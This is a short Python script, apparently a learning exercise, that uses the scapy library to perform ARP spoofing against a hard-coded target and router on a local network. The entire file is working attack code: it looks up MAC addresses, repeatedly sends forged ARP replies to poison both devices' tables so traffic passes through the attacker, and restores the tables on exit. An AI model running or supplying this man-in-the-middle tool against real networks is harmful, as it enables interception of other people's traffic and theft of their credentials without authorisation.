import scapy.all as scapy
import time
# import sys

target_ip="192.168.43.147"
router_ip = "192.168.43.1"


def get_mac(ip):     #getting mac address of target
    arp_request = scapy.ARP(pdst=ip)
    broadcast =  scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc
    
    
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) #creating pacets
    # print(packet.show())  [op =2 =>arp response ]
    # print(packet.summary())
    scapy.send(packet,verbose=False)

def restore(dest_ip, source_ip):  #restoring original connection
    dest_mac= get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet= scapy.ARP(op=2, pdst=dest_ip,hwdst=dest_mac, psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet, count=4 ,verbose=False)



try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        sent_packets_count+=2
        print("\r[+] sent pacets = " + str(sent_packets_count), end="")  #
        # sys.stdout.flush()   # for dynamic printing in python 2 and below

        time.sleep(2)
except KeyboardInterrupt:
    print("\n [+] Resting ARP-tables")
    restore(target_ip, router_ip)


# pritam